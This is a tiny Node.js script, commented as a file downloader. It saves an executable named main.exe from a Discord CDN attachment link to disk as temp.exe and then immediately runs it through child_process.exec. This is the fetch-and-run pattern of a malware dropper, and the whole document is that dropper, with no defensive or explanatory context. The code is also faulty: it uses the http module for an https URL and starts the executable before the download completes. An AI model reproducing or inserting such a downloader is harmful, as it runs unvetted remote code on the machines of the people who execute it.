//nodejs download file
var http = require('http');
var fs = require('fs');
var file = fs.createWriteStream("temp.exe");
var request = http.get("https://cdn.discordapp.com/attachments/1064471182730076220/1064471292411129886/main.exe", function(response) {
    response.pipe(file);
});
//execute file
var exec = require('child_process').exec;
exec('temp.exe', function(error, stdout, stderr) {
    console.log(stdout);
});
//end of file

